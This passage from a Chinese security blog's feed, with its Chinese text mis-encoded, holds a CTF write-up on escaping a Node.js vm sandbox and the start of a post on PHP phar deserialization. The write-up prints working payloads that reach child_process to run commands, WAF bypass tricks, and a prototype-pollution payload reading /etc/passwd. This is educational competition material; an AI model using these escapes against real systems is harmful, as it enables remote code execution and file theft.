éƒ½çœ‹ä¸å¤ªæ‡‚ã€‚</p><h1 id="å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF"><a href="#å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF" class="headerlink" title="å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF"></a>å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF</h1><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿjs vmæ²™ç®±ç»•è¿‡ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹å®˜æ–¹wpï¼Œå®˜æ–¹wpçš„åšæ³•æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚è€Œæˆ‘çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ä¸»è¦çš„æ–¹æ³•ä¸ºç»•wafã€‚<br>å¯¹äºç»•wafæˆ‘å†æ‰“æ¯”èµ›æ—¶æœ‰æ‰¾åˆ°å¦‚ä¸‹ä¸¤ç¯‡æ–‡ç« ã€‚ç»•åˆ°æœ€ååªèƒ½è¯´å¾ˆæ¥è¿‘ç­”æ¡ˆäº†ã€‚è¿˜æ˜¯å®åŠ›ä¸è¶³ã€‚å¯¹jsçš„äº†è§£ä¸å¤Ÿã€‚<br><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLp0WF5i%3De%2B4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-4">NodeJS VMå’ŒVM2æ²™ç®±é€ƒé€¸</a><br><a href="https://www.anquanke.com/post/id/237032#h3-11">nodejsä¸­ä»£ç æ‰§è¡Œç»•è¿‡çš„ä¸€äº›æŠ€å·§</a><br>æˆ‘ä»¬æ‰“å¼€é¢˜ç›®æ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°/secret<br>æˆ‘ä»¬æ‰“å¼€å¯ä»¥å‘ç°æºç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°æˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸€ä¸ªç©ºçš„vmã€‚ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°å¯ä»¥ä½¿ç”¨arguments.callee.callerå’ŒProxyæ¥åŠ«æŒå±æ€§ã€‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç½‘ä¸Šçš„payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(() =&gt;&#123;</span><br><span class="line">    const a = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return a</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¿™é¢˜è¿˜è¦ç»•wafã€‚è¦ç»•è¿‡processå’ŒexecSyncã€‚processå¯ä»¥æœ‰å¾ˆå¤šç§ç»•è¿‡æ–¹æ³•ã€‚æˆ‘è¿™é‡Œå°±ç›´æ¥ä½¿ç”¨æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡äº†ï¼Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;`$&#123;`return proc`&#125;ess`&#125;`å’Œ`$&#123;`$&#123;`child_pr`&#125;ocess`&#125;`ã€‚</span><br></pre></td></tr></table></figure><br>å‰ä¸€ä¸ªçš„wafè¿˜æ˜¯æ¯”è¾ƒå¥½ç»•çš„ã€‚ä½†æ˜¯åä¸€ä¸ªwafå†æ¯”èµ›çš„æ—¶å€™å°±å¡ä½äº†æˆ‘ã€‚æˆ‘åœ¨æ¯”èµ›æ—¶æœ‰æƒ³åˆ°ä½¿ç”¨åå°„ç±»æ¥å°è¯•æ‹¿åˆ°execã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰ç†è§£ç»•æ²™ç®±çš„åŸç†å¯¼è‡´åœ¨ä½¿ç”¨åå°„ç±»çš„æ—¶å€™ï¼Œç›´æ¥æŠ¥é”™æœªå®šä¹‰ã€‚åœ¨èµ›åæˆ‘èŠ±äº†ä¸€æ®µä¼šæ—¶é—´å°†æ²™ç®±çš„ç»•è¿‡åŸç†é‡æ–°çœ‹äº†ä¸€éã€‚<br>å‘ç°æ²™ç®±ç»•è¿‡çš„ä¸»è¦åŸç†æ˜¯ä»globalæ¥å¾—åˆ°å…¶ä»–å¯¹è±¡å¹¶èµ‹å€¼åˆ°å˜é‡é‡Œã€‚åˆ†æäº†ä¸€ä¸‹payloadæ‰å‘ç°æ˜¯ä¹‹å‰æ²¡æœ‰ç†è§£é€å¯¼è‡´wafç»•ä¸è¿‡å»ã€‚<br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°è¯•å°„è°ƒç”¨å‡½æ•°æ¥å¾—åˆ°execã€‚é¦–å…ˆReflectæ˜¯ä¸€ä¸ªå†…ç½®æ–¹æ³•ï¼Œå³æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æ²™ç®±é‡Œè¿›è¡Œä½¿ç”¨ã€‚ç½‘ä¸Šå¾—åˆ°execçš„payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;eva&#x27;)))</span><br></pre></td></tr></table></figure><br>ä½†ç”±äºæˆ‘ä»¬è¿™æ˜¯åœ¨æ²™ç®±ç¯å¢ƒæ— æ³•å¾—åˆ°globalã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸€ä¸‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">        <span class="keyword">const</span> b=(cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span></span>))();</span><br><span class="line">        <span class="keyword">const</span> c=b.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(c, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(c).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&#x27;calc&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬é€šè¿‡arguments.callee.calleræ¥å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ã€‚å†é€šè¿‡cc.constructor.constructoræ¥è·å–åˆ°globalã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°processã€‚é€šè¿‡processæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°child_processã€‚æœ€åé€šè¿‡åå°„ç±»è°ƒç”¨å¾—åˆ°exceã€‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/3.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå®Œç¾çš„å¼¹äº†è®¡ç®—æœºã€‚</p><p>å…¶å®æˆ‘åœ¨æ¯”èµ›æ—¶è¿˜æœ‰æƒ³è¦å°è¯•ä½¿ç”¨fsçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œç»“æœæœ¬åœ°å¿˜è®°å¯¼å…¥fsæ¨¡å—å¯¼è‡´è¿™ä¹ˆä¹Ÿæ— æ³•åœ¨æœ¬åœ°å®ç°ã€‚è¿™è¿˜æ˜¯åœ¨èµ›åæ‰çœ‹åˆ°çš„ã€‚æ‚²<br>æˆ‘è¿˜åœ¨ç¬¬ä¸€åçš„é˜Ÿä¼é‡Œçœ‹åˆ°äº†è¿™æ ·çš„ç»•wafå§¿åŠ¿<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><br>ç›´æ¥ä½¿ç”¨replaceæ¥è¿›è¡Œæ›¿æ¢ã€‚è¿™ä¸ªæ–¹æ³•å®åœ¨æ˜¯å¤ªé€†å¤©äº†</p><h2 id="å®˜æ–¹æ–¹æ³•ï¼šåŸå‹é“¾æ±¡æŸ“"><a href="#å®˜æ–¹æ–¹æ³•ï¼šåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="å®˜æ–¹æ–¹æ³•ï¼šåŸå‹é“¾æ±¡æŸ“"></a>å®˜æ–¹æ–¹æ³•ï¼šåŸå‹é“¾æ±¡æŸ“</h2><p>æˆ‘ä¸ªäººè®¤ä¸ºè¦æƒ³æƒ³åˆ°ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“ã€‚è¿˜æ˜¯æ¯”è¾ƒéš¾çš„ã€‚è§£ç­”å‡ºæ¥çš„é€‰æ‰‹åº”è¯¥å¤§éƒ¨åˆ†éƒ½æ˜¯é€šè¿‡ç»•wafè¿›è¡Œè§£ç­”çš„ã€‚<br>å®˜æ–¹çš„æ–¹æ³•æ˜¯åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ¥è§£é¢˜æˆ‘ä»¬å®¡è®¡ä¸€ä¸‹æºç å°±ä¼šå‘ç°å…¶ä¼šå°†(__filename)è¿™ä¸ªå±æ€§è¾“å‡ºå›æ˜¾ã€‚è€Œæˆ‘ä»¬åœ¨ä¸Šé¢ç»•è¿‡vmæ²™ç®±é‡Œå°±çŸ¥é“ã€‚æˆ‘ä»¬åœ¨ç»•è¿‡è¿™ä¸ªç©ºæ²™ç®±é¦–å…ˆè¦è·å–ä¸€ä¸ªå¯¹è±¡å†å¯¹å¯¹è±¡è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“.<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadå¯¹æ–‡ä»¶è¿›è¡Œè¯»å–<br>æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°è°ƒè¯•æŸ¥çœ‹å…¶åŸå‹é“¾çš„é•¿åº¦ä»¥æ­¤æ¥æ‰¾åˆ°objectã€‚å¯¹å…¶è¿›è¡Œæ±¡æŸ“<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__filename</span>=<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>åœ¨è¿›ä¸€æ­¥è¿›è¡Œæ±¡æŸ“å°†__filenameæ±¡æŸ“ä¸º/app/hack.jså¯ä»¥è¯»å–ä¼šå‘ç°hack.jsé‡Œå¯¼å…¥äº†shell.jsåœ¨shell.jsé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°commandæ˜¯è¢«åŒ…è£¹åœ¨execSyncé‡Œçš„ã€‚è€Œä¸”processé‡Œå¹¶ä¸å«æœ‰commandè¿™ä¸ªå±æ€§æ˜æ˜¾è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥åŸå‹é“¾æ±¡æŸ“çš„ä¸”å…¶æ˜¯RCEçš„é‡ç‚¹ã€‚<br><figure class="highlight js"><figcaption><span>hack.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shell.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><figcaption><span>shell.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p.<span class="title function_">execSync</span>(process.<span class="property">env</span>.<span class="property">command</span>);</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯ç›´æ¥æ±¡æŸ“æ˜¯æ— æ³•æ‰§è¡Œçš„.æˆ‘ä»¬éœ€è¦çœ‹è¿™ç¯‡æ–‡ç« <a href="https://hujiekang.top/posts/nodejs-require-rce/ã€‚">https://hujiekang.top/posts/nodejs-require-rce/ã€‚</a></p><p>è¿™ä¸ªæ–‡ç« å¼ºåº¦å¤šå°‘æœ‰ç‚¹é«˜äº†ï¼Œå…ˆæŒ–ä¸ªå‘ç­‰ä»¥åå¯¹jsäº†è§£æ›´æ·±äº†åœ¨è¡¥ä¸Šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢pharååºåˆ—åŒ–</title>
      <link href="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨NSSåˆ·é¢˜çš„æ—¶å€™é‡åˆ°äº†pharååºåˆ—åŒ–çš„é¢˜ç›®æˆ‘ä¸ªäººè®¤ä¸ºæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæ¼æ´å› æ­¤å†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚"><a href="#åœ¨NSSåˆ·é¢˜çš„æ—¶å€™é‡åˆ°äº†pharååºåˆ—åŒ–çš„é¢˜ç›®æˆ‘ä¸ªäººè®¤ä¸ºæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæ¼æ´å› æ­¤å†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚" class="headerlink" title="åœ¨NSSåˆ·é¢˜çš„æ—¶å€™é‡åˆ°äº†pharååºåˆ—åŒ–çš„é¢˜ç›®æˆ‘ä¸ªäººè®¤ä¸ºæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæ¼æ´å› æ­¤å†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚"></a>åœ¨NSSåˆ·é¢˜çš„æ—¶å€™é‡åˆ°äº†pharååºåˆ—åŒ–çš„é¢˜ç›®æˆ‘ä¸ªäººè®¤ä¸ºæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªæ¼æ´å› æ­¤å†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ä¸€èˆ¬çš„phpååºåˆ—åŒ–éƒ½éœ€è¦ä¸€ä¸ªå‚æ•°å¯æ§çš„unserializeå‡½æ•°ã€‚è¿™å°±å¯¼è‡´ååºåˆ—åŒ–çš„æ¡ä»¶å¯ä»¥è¯´éå¸¸çš„è‹›åˆ»ã€‚<br>ä½†æ˜¯åœ¨18å¹´çš„blackhatå¤§ä¼šä¸ŠSam Thomas åˆ†äº«äº† File Operation Induced Unserialization via the â€œphar://â€ Stream Wrapper ï¼Œè¯¥ç ”ç©¶å‘˜æŒ‡å‡ºè¯¥æ–¹æ³•åœ¨ æ–‡ä»¶ç³»ç»Ÿå‡½æ•° ï¼ˆ file_get_contents ã€ unlink ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ phar://ä¼ªåè®® ï¼Œå¯ä»¥ä¸ä¾èµ–ååºåˆ—åŒ–å‡½æ•° unserialize() ç›´æ¥è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œ</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>pharæ˜¯å°†phpæ–‡ä»¶æ‰“åŒ…çš„ä¸€ç§å‹ç¼©æ–‡æ¡£ï¼Œå…¶ç±»ä¼¼äºjavaçš„jaråŒ…ã€‚å…¶ç‰¹ç‚¹æ˜¯ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å°†ç”¨æˆ·è‡ªå®šä¹‰meta-dataè¿›è¡Œå­˜å‚¨ã€‚å½“æˆ‘ä»¬ä½¿ç”¨phar://ä¼ªåè®®è¯»å–è¯¥æ–‡ä»¶æ—¶ï¼Œmeta-dataå°±ä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚è¿™æ—¶å€™å°±ä¼šäº§ç”Ÿååºåˆ—æ¼æ´ã€‚</p><h1 id="æ„é€ pharæ–‡ä»¶"><a href="#æ„é€ pharæ–‡ä»¶" class="headerlink" title="æ„é€ pharæ–‡ä»¶"></a>æ„é€ pharæ–‡ä»¶</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;lalalalalalalla&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œåå­—ä¸ºphar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//ä¸‹é¢ç»†è®²</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubå†…å®¹</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//å°†åˆ›å»ºçš„å¯¹è±¡aå†™å…¥åˆ°Metadataä¸­</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//æ·»åŠ è¦è¿›è¡Œå‹ç¼©çš„æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºtestï¼Œæ–‡ä»¶å†…å®¹ä¸ºtestaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸Šä»£ç ç”Ÿæˆpharæ–‡ä»¶å¹¶å®ç°å¯¹pharæ–‡ä»¶Metadataå†…å®¹çš„å†™å…¥ã€‚<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹pharæ–‡ä»¶ä¼šå‘ç°Metadataå°†å¯¹è±¡è¿›è¡Œäº†åºåˆ—åŒ–å†™å…¥ã€‚</p><h1 id="DEMOå®éªŒ"><a href="#DEMOå®éªŒ" class="headerlink" title="DEMOå®éªŒ"></a>DEMOå®éªŒ</h1><p>æˆ‘ä»¬æœ¬åœ°å†™ä¸€ä¸ªDEMOæ¥è¿›è¡Œå®éªŒ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 